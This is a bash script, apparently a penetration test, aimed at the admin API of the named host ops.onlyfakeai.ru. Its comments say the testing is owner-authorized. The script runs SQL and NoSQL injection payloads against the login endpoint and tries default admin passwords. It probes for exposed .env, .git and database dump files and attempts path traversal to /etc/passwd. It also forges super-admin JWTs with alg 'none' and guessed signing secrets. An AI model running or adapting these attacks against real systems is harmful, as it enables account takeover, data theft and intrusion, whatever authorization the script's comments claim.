#!/bin/bash
# ops.onlyfakeai.ru admin backend attack surface tests (owner-authorized, read-only except
# bounded login attempts with our own/predictable test inputs; no brute force).
source "$(dirname "$0")/env.sh"
OPS="https://ops.onlyfakeai.ru"

echo "########## 1. Authorization matrix on ops admin API ##########"
JUNK="eyJ<redacted-jwt>."
for p in "/api/auth/verify" "/api/jobs?page=1" "/api/jobs/stats" "/api/profiles?page=1" "/api/analytics?timeframe=day" "/api/analytics/admin-activity" "/api/admin-users" "/api/admin-api-keys"; do
  for mode in none own junk; do
    case "$mode" in
      none) H=() ;;
      own)  H=(-H "Authorization: Bearer $TOKEN") ;;
      junk) H=(-H "Authorization: Bearer $JUNK") ;;
    esac
    code=$(curl -sS -k -m 20 -A "$UA" "${H[@]}" -o /tmp/b.bin -w "%{http_code}" "$OPS$p")
    echo "  $mode  GET $p -> HTTP $code ($(wc -c < /tmp/b.bin)b) : $(head -c 200 /tmp/b.bin | tr -d '\n')"
  done
done

echo
echo "########## 2. /api/auth/login validation & injection probes (bounded) ##########"
post_login() {
  local body="$1"; local label="$2"
  code=$(curl -sS -k -m 25 -A "$UA" -H "Content-Type: application/json" -X POST -d "$body" -o /tmp/b.bin -w "%{http_code}" "$OPS/api/auth/login")
  echo "  [$label] HTTP $code : $(head -c 260 /tmp/b.bin | tr -d '\n')"
}
post_login '{}' "empty"
post_login '{"email":"audit@example.com"}' "email only"
post_login '{"email":"audit@example.com","password":""}' "empty password"
post_login 'x' "invalid json"
post_login '{"email":["a@b.c"],"password":"x"}' "array email (type confusion)"
post_login '{"email":{"$ne":null},"password":{"$ne":null}}' "nosql-style object"
post_login '{"email":"audit@example.com'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}' "sqli email 1"
post_login '{"email":"'"'"' OR 1=1--","password":"x"}' "sqli email 2"
post_login '{"email":"admin@onlyfakeai.ru'"'"'--","password":"x"}' "sqli email 3"
post_login '{"email":"audit@example.com","password":"'"'"' OR '"'"'1'"'"'='"'"'1"}' "sqli password"

echo
echo "########## 3. Limited default-credential checks on /api/auth/login (5 attempts) ##########"
for combo in "admin@onlyfakeai.ru:admin" "admin@onlyfakeai.ru:password" "admin@onlyfakeai.ru:Admin123!" "admin:admin" "support@onlyfakeai.ru:support"; do
  e="${combo%%:*}"; pw="${combo#*:}"
  code=$(curl -sS -k -m 25 -A "$UA" -H "Content-Type: application/json" -X POST \
    -d "{\"email\":\"$e\",\"password\":\"$pw\"}" -o /tmp/b.bin -w "%{http_code}" "$OPS/api/auth/login")
  echo "  [$e:$pw] HTTP $code : $(head -c 160 /tmp/b.bin | tr -d '\n')"
done

echo
echo "########## 4. Static / source / env / backup file exposure ##########"
for p in "/.env" "/.env.local" "/.env.production" "/.git/HEAD" "/.git/config" "/package.json" "/package-lock.json" \
         "/server.js" "/app.js" "/index.js" "/main.js" "/server/index.js" "/routes.js" "/config.js" "/config.json" \
         "/database.js" "/db.js" "/supabase.js" "/admin.js" "/auth.js" "/backup.zip" "/backup.sql" "/dump.sql" \
         "/database.sql" "/export.json" "/users.json" "/profiles.json" "/logs.txt" "/error.log" "/app.log" \
         "/api-docs" "/swagger.json" "/openapi.json" "/debug" "/Dockerfile" "/docker-compose.yml" "/styles.css"; do
  code=$(curl -sS -k -m 20 -A "$UA" -o /tmp/b.bin -w "%{http_code}" "$OPS$p")
  sz=$(wc -c < /tmp/b.bin)
  if [ "$code" != "404" ]; then
    echo "  *** GET $p -> HTTP $code (${sz}b) : $(head -c 220 /tmp/b.bin | tr -d '\n')"
  else
    echo "  GET $p -> 404 (${sz}b)"
  fi
done

echo
echo "########## 5. Static path traversal probes ##########"
for p in "/..%2f.env" "/%2e%2e%2f.env" "/static/..%2f..%2f.env" "/..%2f..%2fetc%2fpasswd" "/%2e%2e/%2e%2e/etc/passwd" "/script.js/../.env"; do
  code=$(curl -sS -k -m 20 -A "$UA" --path-as-is -o /tmp/b.bin -w "%{http_code}" "$OPS$p")
  echo "  GET $p -> HTTP $code ($(wc -c < /tmp/b.bin)b) : $(head -c 160 /tmp/b.bin | tr -d '\n')"
done

echo
echo "########## 6. Forged-JWT matrix against ops admin API ##########"
python3 - <<'PY'
import base64, hmac, hashlib, json
KEY="<publishable-key>"
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def enc(d): return b64(json.dumps(d,separators=(',',':')).encode())
sub="23c8fb62-49c5-42d9-b031-906b97cd1cb4"
claims={"sub":sub,"email":"admin@onlyfakeai.ru","role":"admin","aud":"authenticated","exp":4102444800,"iat":1794320000,"isSuperAdmin":True,"is_super_admin":True,"admin":True}
variants={}
variants["alg_none"]=enc({"alg":"none","typ":"JWT"})+"."+enc(claims)+"."
variants["alg_none_admin"]=enc({"alg":"none","typ":"JWT"})+"."+enc({"sub":"audit-admin","email":"admin@onlyfakeai.ru","role":"admin","exp":4102444800,"isSuperAdmin":True})+".\n"
for secret in ["secret","supabase",KEY,"jwt_secret","your-secret-key","onlyfakeai","admin","changeme"]:
    h=enc({"alg":"HS256","typ":"JWT"}); p=enc(claims)
    sig=b64(hmac.new(secret.encode(),f"{h}.{p}".encode(),hashlib.sha256).digest())
    variants["hs256_"+secret[:12].replace("/","_")]=f"{h}.{p}.{sig}"
for k,v in variants.items():
    open(f"/tmp/opsjwt_{k}.txt","w").write(v)
    print("variant",k,"len",len(v))
PY
for f in /tmp/opsjwt_*.txt; do
  name=$(basename "$f" .txt)
  for p in "/api/auth/verify" "/api/jobs?page=1" "/api/admin-users"; do
    code=$(curl -sS -k -m 20 -A "$UA" -H "Authorization: Bearer $(cat "$f")" -o /tmp/b.bin -w "%{http_code}" "$OPS$p")
    echo "  $name $p -> HTTP $code : $(head -c 140 /tmp/b.bin | tr -d '\n')"
  done
done

echo
echo "########## 7. CORS behaviour of ops admin API ##########"
curl -sS -k -m 20 -A "$UA" -X OPTIONS -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: authorization,content-type" -D - -o /dev/null "$OPS/api/auth/login" | sed 's/\r$//' | grep -iE "^(HTTP|access-control)"
curl -sS -k -m 20 -A "$UA" -H "Origin: https://evil.example" -D - -o /dev/null "$OPS/health" | sed 's/\r$//' | grep -iE "^(HTTP|access-control)"

echo
echo "########## 8. Ops server info leak ##########"
curl -sS -k -m 20 -A "$UA" -D - -o /dev/null "$OPS/" | sed 's/\r$//' | grep -iE "^(HTTP|x-powered-by|server|etag|set-cookie|access-control)"
curl -sS -k -m 20 -A "$UA" -D - -o /dev/null "$OPS/does-not-exist-xyz" | sed 's/\r$//' | grep -iE "^(HTTP|x-powered-by|server|etag)"
